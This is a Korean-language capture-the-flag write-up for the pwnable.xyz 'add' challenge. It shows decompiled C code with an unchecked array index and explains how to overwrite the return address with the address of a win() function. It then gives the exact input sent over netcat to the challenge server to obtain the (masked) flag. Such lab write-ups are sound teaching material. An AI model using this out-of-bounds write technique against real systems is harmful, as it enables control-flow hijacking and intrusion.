# PWNABLE.XYZ
## add
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  __int64 v4; // [rsp+8h] [rbp-78h]
  __int64 v5; // [rsp+10h] [rbp-70h]
  __int64 v6; // [rsp+18h] [rbp-68h]
  __int64 v7[11]; // [rsp+20h] [rbp-60h]
  unsigned __int64 v8; // [rsp+78h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup();
  while ( 1 )
  {
    v4 = 0LL;
    v5 = 0LL;
    v6 = 0LL;
    memset(v7, 0, 0x50uLL);
    printf("Input: ", argv, v7);
    if ( (unsigned int)__isoc99_scanf("%ld %ld %ld", &v4, &v5, &v6) != 3 )
      break;
    v7[v6] = v4 + v5;
    argv = (const char **)v7[v6];
    printf("Result: %ld", argv);
  }
  result = 0;
  __readfsqword(0x28u);
  return result;
}
~~~
코드는 위와 같다. if 에서 break를 벗어나지 않도록 해야겠다는 감이 왔다. break가 걸리면 __readfsqword(0x28u)를 하고 프로그램이 끝나니
따라서 3가지 수를 집어넣어주면 된다. 뭔가 코드에는 flag를 얻는 방법이 없어서 ida의 옆에 함수 부분을 보니 win()이라는 함수가 보인다.
여기서 flag를 얻을 수 있도록 되어있다. 뭔가 감이 온다. v7[v6]을 ret 주소로 만든 다음 v4+v5를 win()의 주소로 만들어주면 된다. 
win의 주소는 400822h 즉 4196386이다. v4+v5==4196386으로 하면 된다. 
v7의 offset인 -0x60h에서 0x08h로 이동 즉 0x68h만큼 이동해야 한다. v7은 한칸에 8바이트이므로 68h(104)/8 즉 13 칸만큼 이동해야 한다.
~~~
 nc svc.pwnable.xyz 30002
Input: 4196386 0 13
Result: 4196386Input: a
FLAG{***********}
~~~
위와 같은 방식으로 flag를 얻을 수 있었다. 

